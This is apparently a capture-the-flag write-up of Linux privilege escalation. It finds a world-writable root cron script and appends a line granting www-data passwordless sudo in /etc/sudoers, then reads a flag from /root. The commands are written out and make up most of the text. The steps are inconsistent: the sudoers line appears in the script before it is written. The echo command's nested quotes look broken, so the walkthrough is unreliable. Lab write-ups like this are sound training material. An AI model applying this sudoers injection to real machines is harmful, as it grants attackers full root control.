# PRIVILEGE ESCALATION

One of the things of the Linux privilege escalation techniques are to check the cron jobs:

1. Check the cron jobs:
	ls -al /etc/cron* /etc/at*

/etc/cron.hourly:
total 16
drwxr-xr-x   2 root     root     4096 Aug 27 03:20 .
drwxr-xr-x 107 root     root     4096 Oct 11 19:42 ..
-rw-r--r--   1 root     root      102 Nov 16  2017 .placeholder
-rwxrwxrwx   1 www-data www-data   56 Oct 11 19:16 cuiteur-cleaning

2. It can be seen from the output that the cuiteur-cleaning we have write access with the user we have logged in:

os-shell> cat /etc/cron.hourly/cuiteur-cleaning
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'

3. The vulnerability has been found now we have to exploit it, we write the user www-data into the /etc/sudoers file so it can have sudo access:

echo "echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers" >> /etc/cron.hourly/cuiteur-cleaning

4. After the hour the command will be executed.
5. sudo ls /root

os-shell> sudo ls /root
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'flag{9f1f16811b12bbfb21a3b0fbad66c27d3b5083102aca73}.jpg'

